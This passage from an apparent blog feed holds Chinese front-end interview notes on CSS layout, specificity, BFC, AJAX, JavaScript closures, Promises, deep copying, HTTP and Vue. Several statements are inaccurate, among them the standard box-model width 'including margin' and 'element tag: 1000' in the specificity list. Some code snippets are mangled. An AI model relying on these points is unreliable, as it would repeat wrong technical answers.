id="三、清除浮动"><a href="#三、清除浮动" class="headerlink" title="三、清除浮动"></a>三、清除浮动</h2><pre><code>overflow: hidden</code></pre><pre><code>//父元素加一个clearfix的类.clearfix:after{    content: '';    display: block;    clear: both}</code></pre><h2 id="四、ajax原理，请求get-和post的去呗，请求发生了什么，跨域怎么解决"><a href="#四、ajax原理，请求get-和post的去呗，请求发生了什么，跨域怎么解决" class="headerlink" title="四、ajax原理，请求get 和post的去呗，请求发生了什么，跨域怎么解决"></a>四、ajax原理，请求get 和post的去呗，请求发生了什么，跨域怎么解决</h2><p>ajax的工作原理相当于在用户和服务器之间加了一个中间层（ajax引擎），使用户操作与服务器响应一步华，并不是所有的请求都提交给服务器，像一些数据验证处理都交给ajax引擎来做，只有确定需要从服务器读取新数据的时候再由ajax引擎代为向服务器提交请求<br>使用Get请求，参数在URL中显示，使用POST方式，则不会显示<br>使用GET数据量小，POST发送数据量大<br>区别： </p><ul><li>get需要注意缓存问题，post不用担心</li><li>post必须设置Content-Type的值为application/x-form-urlencoded</li><li>发送请求是 因为get参数都在url里面，所以send函数发送的参数为null，而post请求在使用send方法时，需要赋予参数<h3 id="ajax请求的五个步骤"><a href="#ajax请求的五个步骤" class="headerlink" title="ajax请求的五个步骤"></a>ajax请求的五个步骤</h3></li></ul><pre><code>// 第一步 创建XMLHTTPRequest对象(异步调用对象)var xml = new XMLHttpRequest();// 第二步 创建一个新的HTTP请求，并指定HTTP请求的方法、URL以及验证信息// 第三步 设置响应HTTP请求状态变化的函数// 发送HTTP请求// 获取数据fun</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>css面试</title>
      <link href="/2019/04/11/css-mian-shi/"/>
      <url>/2019/04/11/css-mian-shi/</url>
      
        <content type="html"><![CDATA[<p>##1 、介绍一下标准的CSS的盒子模型？与低版本IE的盒子模型有什么不同的？</p><ul><li><p>标准盒子模型：宽度=内容的宽度（content）+ border + padding + margin</p></li><li><p>低版本IE盒子模型：宽度=内容宽度（content+border+padding）+ margin</p></li></ul><p>##2、 box-sizing属性？</p><p>用来控制元素的盒子模型的解析模式，默认为content-box</p><ul><li><p>context-box：W3C的标准盒子模型，设置元素的 height/width 属性指的是content部分的高/宽</p></li><li><p>border-box：IE传统盒子模型。设置元素的height/width属性指的是border + padding + content部分的高/宽</p></li></ul><p>##3、 CSS选择器有哪些？哪些属性可以继承？</p><p>####CSS选择符：</p><ul><li>id选择器(#myid)</li><li>类选择器(.myclassname)</li><li>标签选择器(div, h1, p)</li><li>相邻选择器(h1 + p)</li><li>子选择器（ul &gt; li）</li><li>后代选择器（li a）</li><li>通配符选择器（*）</li><li>属性选择器（a[rel=”external”]）</li><li>伪类选择器（a:hover, li:nth-child）</li></ul><p>####可继承的属性：font-size, font-family, color</p><p>####不可继承的样式：border, padding, margin, width, height</p><p>####优先级（就近原则）：!important &gt; [ id &gt; class &gt; tag ]</p><p>####!important 比内联优先级高</p><p>##4、 CSS优先级算法如何计算？</p><ul><li><p>元素选择符： 1</p></li><li><p>class选择符： 10</p></li><li><p>id选择符：100</p></li><li><p>元素标签：1000</p></li></ul><p>➤!important声明的样式优先级最高，如果冲突再进行计算。</p><p>➤如果优先级相同，则选择最后出现的样式。</p><p>➤继承得到的样式的优先级最低。</p><p>##5 、CSS3新增伪类有那些?</p><ul><li><p>p:first-of-type: 选择属于其父元素的首个元素</p></li><li><p>p:last-of-type: 选择属于其父元素的最后元素</p></li><li><p>p:only-of-type: 选择属于其父元素唯一的元素</p></li><li><p>p:only-child: 选择属于其父元素的唯一子元素</p></li><li><p>p:nth-child(2): 选择属于其父元素的第二个子元素</p></li><li><p>:enabled :disabled 表单控件的禁用状态。</p></li><li><p>:checked 单选框或复选框被选中。</p></li></ul><p>##6、如何居中div？如何居中一个浮动元素？如何让绝对定位的div居中？</p><p>####div：</p><pre><code>border: 1pxsolid red;margin: 0auto; height: 50px;width: 80px;</code></pre><p>####浮动元素的上下左右居中：</p><pre><code>border: 1px solid red;float: left;position:absolute;width: 200px;height: 100px;left: 50%;top: 50%;margin: -50px 0 0 -100px;</code></pre><p>####绝对定位的左右居中：</p><pre><code>border: 1px solid black;position: absolute;width: 200px;height: 100px;margin: 0 auto;left: 0;right: 0;</code></pre><p>还有更加优雅的居中方式就是用flexbox，我以后会做整理。</p><p>##7 、display有哪些值？说明他们的作用?</p><ul><li><p>inline（默认）–内联</p></li><li><p>none–隐藏</p></li><li><p>block–块显示</p></li><li><p>table–表格显示</p></li><li><p>list-item–项目列表</p></li><li><p>inline-block</p></li></ul><p>##8、 position的值？</p><ul><li><p>static（默认）：按照正常文档流进行排列；</p></li><li><p>relative（相对定位）：不脱离文档流，参考自身静态位置通过 top, bottom, left, right 定位；</p></li><li><p>absolute(绝对定位)：参考距其最近一个不为static的父级元素通过top, bottom, left, right 定位；</p></li><li><p>fixed(固定定位)：所固定的参照对像是可视窗口。</p></li></ul><p>##9、 CSS3有哪些新特性？</p><p>➤RGBA和透明度</p><p>➤background-image background-origin(content-box/padding-box/border-box) background-size background-repeat</p><p>➤word-wrap（对长的不可分割单词换行）word-wrap：break-word</p><p>➤文字阴影：text-shadow： 5px 5px 5px #FF0000;（水平阴影，垂直阴影，模糊距离，阴影颜色）</p><p>➤font-face属性：定义自己的字体</p><p>➤圆角（边框半径）：border-radius 属性用于创建圆角</p><p>➤边框图片：border-image: url(border.png) 30 30 round</p><p>➤盒阴影：box-shadow: 10px 10px 5px #888888</p><p>➤媒体查询：定义两套css，当浏览器的尺寸变化时会采用不同的属性</p><p>10、 请解释一下CSS3的flexbox（弹性盒布局模型）,以及适用场景？</p><p>该布局模型的目的是提供一种更加高效的方式来对容器中的条目进行布局、对齐和分配空间。在传统的布局方式中，block 布局是把块在垂直方向从上到下依次排列的；</p><p>而 inline 布局则是在水平方向来排列。弹性盒布局并没有这样内在的方向限制，可以由开发人员自由操作。</p><p>试用场景：弹性布局适合于移动前端开发，在Android和ios上也完美支持。</p><p>11 、用纯CSS创建一个三角形的原理是什么？</p><p>首先，需要把元素的宽度、高度设为0。然后设置边框样式。</p><p>width: 0;<br>height: 0;</p><p>border-top: 40px solid transparent;</p><p>border-left: 40px solid transparent;</p><p>border-right: 40px solid transparent;</p><p>border-bottom: 40px solid #ff0000;</p><p>12 、一个满屏品字布局如何设计?</p><p>第一种真正的品字：</p><p>➤三块高宽是确定的；</p><p>➤上面那块用margin: 0 auto;居中；</p><p>➤下面两块用float或者inline-block不换行；</p><p>➤用margin调整位置使他们居中。</p><p>第二种全屏的品字布局:</p><p>上面的div设置成100%，下面的div分别宽50%，然后使用float或者inline使其不换行。</p><p>13、 常见的兼容性问题？</p><p>➤不同浏览器的标签默认的margin和padding不一样。</p><p>*{margin:0;padding:0;}</p><p>➤IE6双边距bug：块属性标签float后，又有横行的margin情况下，在IE6显示margin比设置的大。hack：display:inline;将其转化为行内属性。</p><p>➤渐进识别的方式，从总体中逐渐排除局部。首先，巧妙的使用“9”这一标记，将IE浏览器从所有情况中分离出来。接着，再次使用“+”将IE8和IE7、IE6分离开来，这样IE8已经独立识别。</p><p>{background-color:#f1ee18;<br>/<em>所有识别</em>/</p><p>.background-color:#00deff9;</p><p>/<em>IE6、7、8识别</em>/</p><p>+background-color:#a200ff;</p><p>/<em>IE6、7识别</em>/</p><p>_background-color:#1e0bd1;</p><p>/<em>IE6识别</em>/}</p><p>➤设置较小高度标签（一般小于10px），在IE6，IE7中高度超出自己设置高度。hack：给超出高度的标签设置overflow:hidden;或者设置行高line-height 小于你设置的高度。</p><p>➤IE下，可以使用获取常规属性的方法来获取自定义属性,也可以使用getAttribute()获取自定义属性；Firefox下，只能使用getAttribute()获取自定义属性。解决方法:统一通过getAttribute()获取自定义属性。</p><p>➤Chrome 中文界面下默认会将小于 12px 的文本强制按照 12px 显示,可通过加入 CSS 属性 -webkit-text-size-adjust: none; 解决。</p><p>➤超链接访问过后hover样式就不出现了，被点击访问过的超链接样式不再具有hover和active了。</p><p>解决方法是改变CSS属性的排列顺序:L-V-H-A ( love hate ): a:link {} a:visited {} a:hover {} a:active {}</p><p>14、 为什么要初始化CSS样式</p><p>因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，如果没对CSS初始化往往会出现浏览器之间的页面显示差异。</p><p>15、 absolute的containing block计算方式跟正常流有什么不同？</p><p>无论属于哪种，都要先找到其祖先元素中最近的 position 值不为 static 的元素，然后再判断：</p><p>➤若此元素为 inline 元素，则 containing block 为能够包含这个元素生成的第一个和最后一个 inline box 的 padding box (除 margin, border 外的区域) 的最小矩形；</p><p>➤否则,则由这个祖先元素的 padding box 构成。</p><p>如果都找不到，则为 initial containing block。</p><p>补充：</p><p>➤static(默认的)/relative：简单说就是它的父元素的内容框（即去掉padding的部分）</p><p>➤absolute: 向上找最近的定位为absolute/relative的元素</p><p>➤fixed: 它的containing block一律为根元素(html/body)</p><p>16、 CSS里的visibility属性有个collapse属性值？在不同浏览器下以后什么区别？</p><p>当一个元素的visibility属性被设置成collapse值后，对于一般的元素，它的表现跟hidden是一样的。</p><p>➤chrome中，使用collapse值和使用hidden没有区别。</p><p>➤firefox，opera和IE，使用collapse值和使用display：none没有什么区别。</p><p>17、 display:none与visibility：hidden的区别？</p><p>display：none 不显示对应的元素，在文档布局中不再分配空间（回流+重绘）</p><p>visibility：hidden 隐藏对应元素，在文档布局中仍保留原来的空间（重绘）</p><p>18、 position跟display、overflow、float这些特性相互叠加后会怎么样？</p><p>display属性规定元素应该生成的框的类型；position属性规定元素的定位类型；float属性是一种布局方式，定义元素在哪个方向浮动。</p><p>类似于优先级机制：position：absolute/fixed优先级最高，有他们在时，float不起作用，display值需要调整。float 或者absolute定位的元素，只能是块元素或表格。</p><p>19、 对BFC规范(块级格式化上下文：block formatting context)的理解？</p><p>BFC规定了内部的Block Box如何布局。</p><p>定位方案：</p><p>➤内部的Box会在垂直方向上一个接一个放置。</p><p>➤Box垂直方向的距离由margin决定，属于同一个BFC的两个相邻Box的margin会发生重叠。</p><p>➤每个元素的margin box 的左边，与包含块border box的左边相接触。</p><p>➤BFC的区域不会与float box重叠。</p><p>➤BFC是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。</p><p>➤计算BFC的高度时，浮动元素也会参与计算。</p><p>满足下列条件之一就可触发BFC</p><p>➤根元素，即html</p><p>➤float的值不为none（默认）</p><p>➤overflow的值不为visible（默认）</p><p>➤display的值为inline-block、table-cell、table-caption</p><p>➤position的值为absolute或fixed</p><p>20、 为什么会出现浮动和什么时候需要清除浮动？清除浮动的方式？</p><p>浮动元素碰到包含它的边框或者浮动元素的边框停留。由于浮动元素不在文档流中，所以文档流的块框表现得就像浮动框不存在一样。</p><p>浮动元素会漂浮在文档流的块框上。</p><p>浮动带来的问题：</p><p>➤父元素的高度无法被撑开，影响与父元素同级的元素</p><p>➤与浮动元素同级的非浮动元素（内联元素）会跟随其后</p><p>➤若非第一个元素浮动，则该元素之前的元素也需要浮动，否则会影响页面显示的结构。</p><p>清除浮动的方式：</p><p>➤父级div定义height</p><p>➤最后一个浮动元素后加空div标签 并添加样式clear:both。</p><p>➤包含浮动元素的父标签添加样式overflow为hidden或auto。</p><p>➤父级div定义zoom</p><p>21、 上下margin重合的问题</p><p>在重合元素外包裹一层容器，并触发该容器生成一个BFC。</p><p>例子：</p><div class="aside"></div><div class="text"> <div class="main"></div></div><!--下面是css代码-->.aside {<p>margin-bottom: 100px; width: 100px;</p><p>height: 150px;</p><p>background: #f66; }</p><p>.main {</p><p>margin-top: 100px;</p><p>height: 200px;</p><p>background: #fcc; }</p><p>.text{</p><p>/*盒子main的外面包一个div，</p><p>通过改变此div的属性使两个</p><p>盒子分属于两个不同的BFC，</p><p>以此来阻止margin重叠*/overflow: hidden;</p><p>//此时已经触发了BFC属性。}</p><p>22、设置元素浮动后，该元素的display值是多少？</p><p>自动变成display:block</p><p>23 、移动端的布局用过媒体查询吗？</p><p>通过媒体查询可以为不同大小和尺寸的媒体定义不同的css，适应相应的设备的显示。</p><p>➤里边</p><link rel="stylesheet" type="text/css" href="xxx.css" media="only screen and (max-device-width:480px)"><p>➤CSS : @media only screen and (max-device-width:480px) {/css样式/}</p><p>24 、使用 CSS 预处理器吗？</p><p>Less sass</p><p>25、 CSS优化、提高性能的方法有哪些？</p><p>➤避免过度约束</p><p>➤避免后代选择符</p><p>➤避免链式选择符</p><p>➤使用紧凑的语法</p><p>➤避免不必要的命名空间</p><p>➤避免不必要的重复</p><p>➤最好使用表示语义的名字。一个好的类名应该是描述他是什么而不是像什么</p><p>➤避免！important，可以选择其他选择器</p><p>➤尽可能的精简规则，你可以合并不同类里的重复规则</p><p>26 、浏览器是怎样解析CSS选择器的？</p><p>CSS选择器的解析是从右向左解析的。若从左向右的匹配，发现不符合规则，需要进行回溯，会损失很多性能。</p><p>若从右向左匹配，先找到所有的最右节点，对于每一个节点，向上寻找其父节点直到找到根元素或满足条件的匹配规则，则结束这个分支的遍历。</p><p>两种匹配规则的性能差别很大，是因为从右向左的匹配在第一步就筛选掉了大量的不符合条件的最右节点（叶子节点），而从左向右的匹配规则的性能都浪费在了失败的查找上面。</p><p>而在 CSS 解析完毕后，需要将解析的结果与 DOM Tree 的内容一起进行分析建立一棵 Render Tree，最终用来进行绘图。</p><p>在建立 Render Tree 时（WebKit 中的「Attachment」过程），浏览器就要为每个 DOM Tree 中的元素根据 CSS 的解析结果（Style Rules）来确定生成怎样的 Render Tree。</p><p>27、 在网页中的应该使用奇数还是偶数的字体？为什么呢？</p><p>使用偶数字体。偶数字号相对更容易和 web 设计的其他部分构成比例关系。Windows 自带的点阵宋体（中易宋体）从 Vista 开始只提供 12、14、16 px 这三个大小的点阵，而 13、15、17 px时用的是小一号的点。（即每个字占的空间大了 1 px，但点阵没变），于是略显稀疏。</p><p>28、 margin和padding分别适合什么场景使用？</p><p>何时使用margin：</p><p>➤需要在border外侧添加空白</p><p>➤空白处不需要背景色</p><p>➤上下相连的两个盒子之间的空白，需要相互抵消时。</p><p>何时使用padding：</p><p>➤需要在border内侧添加空白</p><p>➤空白处需要背景颜色</p><p>➤上下相连的两个盒子的空白，希望为两者之和。</p><p>兼容性的问题：在IE5 IE6中，为float的盒子指定margin时，左侧的margin可能会变成两倍的宽度。通过改变padding或者指定盒子的display：inline解决。</p><p>29、 元素竖向的百分比设定是相对于容器的高度吗？</p><p>当按百分比设定一个元素的宽度时，它是相对于父容器的宽度计算的，但是，对于一些表示竖向距离的属性，例如 padding-top , padding-bottom , margin-top , margin-bottom 等，当按百分比设定它们时，依据的也是父容器的宽度，而不是高度。</p><p>30、 全屏滚动的原理是什么？用到了CSS的哪些属性？</p><p>➤原理：有点类似于轮播，整体的元素一直排列下去，假设有5个需要展示的全屏页面，那么高度是500%，只是展示100%，剩下的可以通过transform进行y轴定位，也可以通过margin-top实现</p><p>➤overflow：hidden；transition：all 1000ms ease；</p><p>31、 什么是响应式设计？响应式设计的基本原理是什么？如何兼容低版本的IE？</p><p>响应式网站设计(Responsive Web design)是一个网站能够兼容多个终端，而不是为每一个终端做一个特定的版本。</p><p>基本原理是通过媒体查询检测不同的设备屏幕尺寸做处理。</p><p>页面头部必须有meta声明的viewport。</p><meta name="’viewport’" content="”width=device-width," <p="">initial-scale=1. maximum-scale=1,<p></p><p>user-scalable=no”&gt;</p><p>32、 视差滚动效果？</p><p>视差滚动（Parallax Scrolling）通过在网页向下滚动的时候，控制背景的移动速度比前景的移动速度慢来创建出令人惊叹的3D效果。</p><p>➤CSS3实现</p><p>优点：开发时间短、性能和开发效率比较好，缺点是不能兼容到低版本的浏览器</p><p>➤jQuery实现</p><p>通过控制不同层滚动速度，计算每一层的时间，控制滚动效果。</p><p>优点：能兼容到各个版本的，效果可控性好</p><p>缺点：开发起来对制作者要求高</p><p>➤插件实现方式</p><p>例如：parallax-scrolling，兼容性十分好</p><p>33、 ::before 和 :after中双冒号和单冒号有什么区别？解释一下这2个伪元素的作用</p><p>➤单冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素。</p><p>➤::before就是以一个子元素的存在，定义在元素主体内容之前的一个伪元素。并不存在于dom之中，只存在在页面之中。</p><p>:before 和 :after 这两个伪元素，是在CSS2.1里新出现的。起初，伪元素的前缀使用的是单冒号语法，但随着Web的进化，在CSS3的规范里，伪元素的语法被修改成使用双冒号，成为::before ::after</p><p>34 、你对line-height是如何理解的？</p><p>行高是指一行文字的高度，具体说是两行文字间基线的距离。CSS中起高度作用的是height和line-height，没有定义height属性，最终其表现作用一定是line-height。</p><p>单行文本垂直居中：把line-height值设置为height一样大小的值可以实现单行文字的垂直居中，其实也可以把height删除。</p><p>多行文本垂直居中：需要设置display属性为inline-block。</p><p>35 、怎么让Chrome支持小于12px 的文字？</p><p>p{<br>font-size:10px;</p><p>-webkit-transform:scale(0.8);</p><p>}</p><p>//0.8是缩放比例</p><p>36、让页面里的字体变清晰，变细用CSS怎么做？</p><p>-webkit-font-smoothing在window系统下没有起作用，但是在IOS设备上起作用-webkit-font-smoothing：antialiased是最佳的，灰度平滑。</p><p>37、position:fixed;在android下无效怎么处理？</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>面试题</title>
      <link href="/2018/05/02/mian-shi-ti/"/>
      <url>/2018/05/02/mian-shi-ti/</url>
      
        <content type="html"><![CDATA[<p>套路</p><p>举例<br>将不会的变成会的<br>侃侃而谈<br>#HTML 押题</p><p>###一、（必考） 你是如何理解 HTML 语义化的？</p><ol><li>第一种举例，段落用 p，边栏用 aside，主要内容用 main 标签</li><li>第二种<br>最开始是 PHP 后端写 HTML，不会 CSS，于是就用 table 来布局。table 使用展示表格的。严重违反了 HTML 语义化。<br>后来有了专门的写 CSS 的前端，他们会使用 DIV + CSS 布局，主要是用 float 和绝对定位布局。稍微符合了 HTML 语义化。<br>再后来，前端专业化，知道 HTML 的各个标签的用法，于是会使用恰当的标签来展示内容，而不是傻傻的全用 div，会尽量使用 h1、ul、p、main、header 等标签<br>语义化的好处是已读、有利于SEO等。</li></ol><p>###二、meta viewport 是做什么用的，怎么写？</p><ol><li>死背： <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"><br>控制页面在移动端不要缩小显示。</li><li>侃侃而谈<br><br>一开始，所有页面都是给PC准备的，乔布斯推出 iPhone 3GS，页面是不适应手机屏幕的，所以乔布斯的工程师想了一个办法，默认把手机模拟成 980px，页面缩小。<br>后来，智能手机普及，这个功能在部分网站不需要了，所以我们就用 meta:vp 让手机不要缩小我的网页。</li></ol><p>###三、canvas 元素是干什么的？<br>项目丢给他。<br>看 MDN 的 canvas 入门手册。</p><p>#CSS 押题</p><p>###一、（必考） 说说盒模型。</p><p>举例：<br>content-box: width == 内容区宽度<br>border-box: width == 内容区宽度 + padding 宽度 + border 宽度</p><p>###二、css reset 和 normalize.css 有什么区别？</p><p>考英文：</p><ol><li>reset 重置，之前的样式我不要，a{color: red;}，抛弃默认样式</li><li>normalize 让所有浏览器的标签都跟标准规定的默认样式一致，各浏览器上的标签默认样式基本统一。</li></ol><p>###三、（必考）如何居中？<br>平时总结：</p><ol><li>水平居中：<br> 内联：爸爸身上写 text-align:center;<br> 块级：margin-left: auto; margin-right: auto;</li><li>垂直居中： <a href="https://jscode.me/t/topic/1936" target="_blank" rel="noopener">https://jscode.me/t/topic/1936</a></li></ol><p>###四、选择器优先级如何确定？</p><ol><li>选择器越具体，优先级越高。 #xxx 大于 .yyy</li><li>同样优先级，写在后面的覆盖前面的。</li><li>color: red !important; 优先级最高。</li></ol><p>###五、BFC 是什么？<br>举例：</p><ol><li>overflow:hidden 清除浮动。（方方总是用 .clearfix 清除浮动，坚决不用 overflow:hidden 清除浮动）</li><li>overflow:hidden 取消父子 margin 合并。<a href="http://jsbin.com/conulod/1/edit?html,css,js,output" target="_blank" rel="noopener">http://jsbin.com/conulod/1/edit?html,css,js,output</a> （方方用 padding-top: 1px;）</li></ol><p>###六、如何清除浮动？</p><ol><li>overflow: hidden （方方反对）</li><li>.clearfix 清除浮动写在爸爸身上</li></ol><pre><code> .clearfix::after{     content: '';     display: block;     clear:both; } .clearfix{     zoom: 1; /* IE 兼容 */ }</code></pre><p>#JS 押题</p><p>###一、JS 有哪些数据类型？<br>string number bool undefined null object symbol<br>object 包括了数组、函数、正则、日期等对象<br>一旦出现（数组、函数、正则、日期、NaN）直接0分</p><p>###二、（必考） Promise 怎么使用？</p><p>####then</p><pre><code>  $.ajax(...).then(成功函数, 失败函数)</code></pre><p>####链式 then</p><pre><code>  $.ajax(...).then(成功函数, 失败函数).then(成功函数2, 失败函数2)</code></pre><p>####如何自己生成 Promise 对象</p><pre><code>  function xxx(){      return new Promise(function(resolve, reject){          setTimeout(()=&gt;{              resolve() 或者 reject()          },3000)      })  }  xxx().then(...)</code></pre><p>###三、（必考） AJAX 手写一下？</p><pre><code> let xhr = new XMLHttpRequest() xhr.open('POST', '/xxxx') xhr.onreadystatechange = function(){     if(xhr.readyState === 4 &amp;&amp; xhr.status === 200){         console.log(xhr.responseText)     } } xhr.send('a=1&amp;b=2(http请求的第四部分)')</code></pre><p>###四、（必考）闭包是什么？</p><pre><code> function (){     var n = 0     return function(){         n += 1     } } let  adder = () adder() // n === 1 adder() // n === 2 console.log(n) // n is not defined</code></pre><p>正确参考：<a href="https://zhuanlan.zhihu.com/p/22486908" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/22486908</a></p><p>###五、（必考）这段代码里的 this 是什么？</p><ol><li>fn() 里面的 this 就是 window<br></li><li>fn() 是 strict mode，this 就是 undefined</li><li>a.b.c.fn() 里面的 this 就是 a.b.c</li><li>new F() 里面的 this 就是新生成的实例</li><li>() =&gt; console.log(this) 里面 this 跟外面的 this 的值一模一样<br>正确参考：<a href="https://zhuanlan.zhihu.com/p/23804247" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/23804247</a></li></ol><p>###六、（必考）什么是立即执行函数？使用立即执行函数的目的是什么？</p><pre><code> ;(function (){     var name }()) ;(function (){     var name })() !!!!!!!function (){     var name }() ~function (){     var name }()</code></pre><p>造出一个函数作用域，防止污染全局变量</p><p>ES 6 新语法</p><p> {<br>     let  name<br> }</p><p>###七、async/await 语法了解吗？目的是什么？</p><pre><code> function returnPromise(){     return new Promise(function(resolve, reject){         setTimeout(()=&gt;{             resolve('fuck')         },3000)     }) } returnPromise().then((result)=&gt;{     result === 'fuck' }) var result = await returnPromise() result === 'fuck'</code></pre><p>把异步代码写成同步代码。</p><p>###八、如何实现深拷贝？</p><ol><li>JSON 来深拷贝</li></ol><pre><code>// 将对象变成字符串 var a = {...} //    用字符串生成对象 var b = JSON.parse(JSON.stringify(a) )</code></pre><p>#####缺点：JSON 不支持函数、引用、undefined、RegExp、Date……</p><ol start="2"><li>递归拷贝</li></ol><pre><code> function clone(object){     var object2     if(! (object instanceof Object) ){         return object     }else if(object instanceof Array){         object2 = []     }else if(object instanceof Function){         object2 = eval(object.toString())     }else if(object instanceof Object){         object2 = {}     }         你也可以把 Array Function Object 都当做 Object 来看待，参考 https://juejin.im/post/587dab348d6d810058d87a0a     for(let key in object){         object2[key] = clone(object[key])     }     return object2 }</code></pre><ol start="3"><li>环</li><li>RegExp、Date、Set、Symbol、WeakMap</li></ol><p>###九、如何实现数组去重？</p><ol><li>计数排序的逻辑（只能正整数）</li></ol><pre><code> var a = [4,2,5,6,3,4,5] var hashTab = {} for(let i=0; i&lt;a.length;i++){     if(a[i] in hashTab){         // 什么也不做     }else{         hashTab[ a[i] ] = true     } } //hashTab: {4: true, 2: true, 5: true, 6:true, 3: true} console.log(Object.keys(hashTab)) // ['4','2','5','6','3']</code></pre><ol start="2"><li>Set 去重</li></ol><pre><code> Array.from(new Set(a))</code></pre><ol start="3"><li>WeakMap 任意类型去重</li></ol><p>###十、如何用正则实现 string.trim() ？</p><pre><code> function trim(string){     return string.replace(/^\s+|\s+$/g, '') }</code></pre><p>###十一、JS 原型是什么？<br>举例<br>var a = [1,2,3]<br>只有0、1、2、length 4 个key<br>为什么可以 a.push(4) ，push 是哪来的？<br>a.proto === Array.prototype<br>push 就是沿着 a.proto 找到的，也就是 Array.prototype.push<br>Array.prototype 还有很多方法，如 join、pop、slice、splice<br>Array.prototype 就是 a 的原型（proto）<br>参考：<a href="https://zhuanlan.zhihu.com/p/23090041" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/23090041</a><br>ES 6 中的 class 了解吗？<br>把 MDN class 章节看完<br>记住一个例子<br>JS 如何实现继承？</p><p>原型链</p><p>  function Animal(){<br>      this.body = ‘肉体’<br>  }<br>  Animal.prototype.move = function(){</p><p>  }</p><p>  function Human(name){<br>      Animal.apply(this, arguments)<br>      this.name = name<br>  }<br>  // Human.prototype.<strong>proto</strong> = Animal.prototype // 非法</p><p>  var f = function(){}<br>  f.prototype = Animal.prototype<br>  Human.prototype = new f()</p><p>  Human.prototype.useTools = function(){}</p><p>  var frank = new Human()<br>extends 关键字<br>  class Animal{<br>      constructor(){<br>          this.body = ‘肉体’<br>      },<br>      move(){}<br>  }<br>  class Human extends Animal{<br>      constructor(name){<br>          super()<br>          this.name = name<br>      },<br>      useTools(){}<br>  }<br>  var frank = new Human()<br>== 相关题目直接反着答（放弃）</p><p>DOM 押题</p><p>DOM 事件模型是什么？<br>冒泡<br>捕获<br>如果这个元素是被点击的元素，那么捕获不一定在冒泡之前，顺序是由监听顺序决定的。<br>移动端的触摸事件了解吗？<br>touchstart touchmove touchend touchcancel<br>模拟 swipe 事件：记录两次 touchmove 的位置差，如果后一次在前一次的右边，说明向右滑了。<br>事件委托是什么？有什么好处？</p><p>假设父元素有4个儿子，我不监听4个儿子，而是监听父元素，看触发事件的元素是哪个儿子，这就是事件委托。<br>可以监听还没有出生的儿子（动态生成的元素）。省监听器。</p><p>function listen(element, eventType, selector, fn){<br> element.addEventListener(eventType, e=&gt;{<br>     if(e.target.matches(selector)){<br>         fn.call(el, e, el)<br>     }<br> })<br>}// 有 bug 但是可以应付面试官的事件委托<br>function listen(element, eventType, selector, fn) {<br> element.addEventListener(eventType, e =&gt; {<br>     let el = e.target<br>     while (!el.matches(selector)) {<br>         if (element === el) {<br>             el = null<br>             break<br>         }<br>         el = el.parentNode<br>     }<br>     el &amp;&amp; fn.call(el, e, el)<br> })<br> return element<br>} // 工资 12k+ 的前端写的事件委托<br>listen(ul, ‘click’, ‘li’, ()=&gt;{})</p><p>ul&gt;li*5&gt;span<br>HTTP 押题</p><p>HTTP 状态码知道哪些？<br>301 和 302 的区别是什么？<br>301 永久重定向，浏览器会记住<br>302 临时重定向<br>HTTP 缓存怎么做？<br>Cache-Control: max-age=300<br><a href="http://cdn.com/1.js?v=1" target="_blank" rel="noopener">http://cdn.com/1.js?v=1</a> 避开缓存<br>Cache-Control 和 Etag 的区别是什么？<br>Cookie 是什么？Session 是什么？<br>Cookie<br>HTTP响应通过 Set-Cookie 设置 Cookie<br>浏览器访问指定域名是必须带上 Cookie 作为 Request Header<br>Cookie 一般用来记录用户信息<br>Session<br>Session 是服务器端的内存（数据）<br>Session 一般通过在 Cookie 里记录 SessionID 实现<br>SessionID 一般是随机数<br>LocalStorage 和 Cookie 的区别是什么？<br>Cookie 会随请求被发到服务器上，而 LocalStorage 不会<br>Cookie 大小一般4k以下，LocalStorage 一般5Mb 左右<br>（必考）GET 和 POST 的区别是什么？<br>参数。GET 的参数放在 url 的查询参数里，POST 的参数（数据）放在请求消息体里。<br>安全（扯淡）。GET 没有 POST 安全（都不安全）<br>GET 的参数（url查询参数）有长度限制，一般是 1024 个字符。POST 的参数（数据）没有长度限制（扯淡，4~10Mb 限制）<br>包。GET 请求只需要发一个包，POST 请求需要发两个以上包（因为 POST 有消息体）（扯淡，GET 也可以用消息体）<br>GET 用来读数据，POST 用来写数据，POST 不幂等（幂等的意思就是不管发多少次请求，结果都一样。）<br>（必考）怎么跨域？JSONP 是什么？CORS 是什么？postMessage 是什么？<br>JSONP<br>CORS<br>postMessage 看一下 MDN<br>Vue 押题</p><p>（必考）Vue 有哪些生命周期钩子函数？</p><p>看文档：<a href="https://cn.vuejs.org/v2/api/#%E9%80%89%E9%A1%B9-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%92%A9%E5%AD%90" target="_blank" rel="noopener">https://cn.vuejs.org/v2/api/#%E9%80%89%E9%A1%B9-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%92%A9%E5%AD%90</a><br>（必考）Vue 如何实现组件通信？</p><p>父子通信（使用 Prop 传递数据、使用 v-on 绑定自定义事件）<br>爷孙通信（通过两对父子通信，爷爸之间父子通信，爸儿之间父子通信）<br>兄弟通信（new Vue() 作为 eventBus）<br>Vuex 的作用是什么？<br>看文档、博客 <a href="https://vuex.vuejs.org/zh-cn/intro.html" target="_blank" rel="noopener">https://vuex.vuejs.org/zh-cn/intro.html</a><br>VueRouter 路由是什么？<br>看文档、博客<br>Vue 